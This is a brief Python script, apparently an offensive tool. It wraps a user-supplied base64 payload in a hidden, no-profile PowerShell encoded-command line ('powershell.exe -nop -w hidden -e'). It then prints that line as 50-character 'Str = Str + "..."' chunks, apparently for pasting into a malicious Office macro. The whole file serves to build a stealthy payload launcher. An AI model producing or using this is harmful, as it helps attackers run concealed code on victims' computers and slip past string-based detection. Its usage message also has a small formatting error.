#!/usr/bin/env python3
import sys

if len(sys.argv) < 2:
    print(f"Usage: sys.argv[0] base64String")
    exit(1)

b64payload = sys.argv[1]

str = f"powershell.exe -nop -w hidden -e {b64payload}"

n = 50

for i in range(0, len(str), n):
        print("Str = Str + " + '"' + str[i:i+n] + '"')
